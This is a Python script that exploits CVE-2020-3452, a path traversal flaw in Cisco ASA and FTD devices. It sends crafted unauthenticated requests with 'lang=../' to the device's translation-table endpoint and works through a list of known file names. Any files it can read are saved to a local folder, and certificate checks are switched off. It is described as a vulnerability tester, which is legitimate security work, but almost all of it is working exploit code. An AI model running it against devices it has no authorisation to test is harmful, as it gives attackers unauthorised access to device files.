import requests
import sys
import os

"""
Author: Vahe

Cisco ASA Path Traversal Vulnerability Tester (CVE-2020-3452)

Description:
CVE-2020-3452 is a directory traversal vulnerability in Cisco ASA (Adaptive Security Appliance) and Cisco FTD (Firepower Threat Defense). The vulnerability allows unauthenticated remote attackers to access sensitive files through specially crafted HTTP requests. This can result in unauthorized access to configuration files, scripts, and other critical resources. Exploitation of this vulnerability does not require authentication, making it especially dangerous.

Purpose of this script:
This script automates testing for CVE-2020-3452 by attempting to retrieve a list of known sensitive files from the target Cisco ASA device. If the script successfully retrieves these files without authentication, the target device is vulnerable.

Usage:
    python cisco_asa_tester.py <target-ip-or-hostname>

The results (retrieved files) will be stored in a directory named 'cisco_asa_files'.
"""

CISCO_KNOWN_FILES = [
    "logo.gif", "http_auth.html", "user_dialog.html", "localization_inc.lua", "portal_inc.lua", 
    "include", "nostcaccess.html", "ask.html", "no_svc.html", "svc.html", "session.js", 
    "useralert.html", "ping.html", "help", "app_index.html", "tlbr", "portal_forms.js", 
    "logon_forms.js", "win.js", "portal.css", "portal.js", "sess_update.html", "blank.html", 
    "noportal.html", "portal_ce.html", "portal.html", "home", "logon_custom.css", 
    "portal_custom.css", "preview.html", "session_expired", "custom", "portal_elements.html", 
    "commonspawn.js", "common.js", "appstart.js", "appstatus", "relaymonjar.html", 
    "relaymonocx.html", "relayjar.html", "relayocx.html", "portal_img", "color_picker.js", 
    "color_picker.html", "cedhelp.html", "cedmain.html", "cedlogon.html", "cedportal.html", 
    "cedsave.html", "cedf.html", "ced.html", "lced.html", "files", "041235123432C2", 
    "041235123432U2", "pluginlib.js", "shshim", "do_url", "clear_cache", "connection_failed_form", 
    "apcf", "ucte_forbidden_data", "ucte_forbidden_url", "cookie", "session_password.html", 
    "tunnel_linux.jnlp", "tunnel_mac.jnlp", "sdesktop", "gp-gip.html", "auth.html", 
    "wrong_url.html", "logon_redirect.html", "logout.html", "logon.html", "test_chargen"
]

def check_vulnerability(target):
    os.makedirs("cisco_asa_files", exist_ok=True)

    vulnerable = False
    for file in CISCO_KNOWN_FILES:
        url = f"https://{target}/+CSCOT+/translation-table?type=mst&textdomain=%2bCSCOE%2b/{file}&default-language&lang=../"
        try:
            response = requests.get(url, verify=False, timeout=10)
            if response.status_code == 200 and response.text and "<html" not in response.text.lower():
                vulnerable = True
                print(f"[+] Vulnerable! Retrieved file: {file}")
                with open(f"cisco_asa_files/{file}", 'w', encoding='utf-8') as f:
                    f.write(response.text)
            else:
                print(f"[-] Not vulnerable for file: {file}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed for {file}: {e}")

    if vulnerable:
        print(f"\nTarget {target} is vulnerable to CVE-2020-3452!")
    else:
        print(f"\nTarget {target} does NOT appear vulnerable to CVE-2020-3452.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <target>")
        sys.exit(1)

    requests.packages.urllib3.disable_warnings()
    target = sys.argv[1]
    check_vulnerability(target)
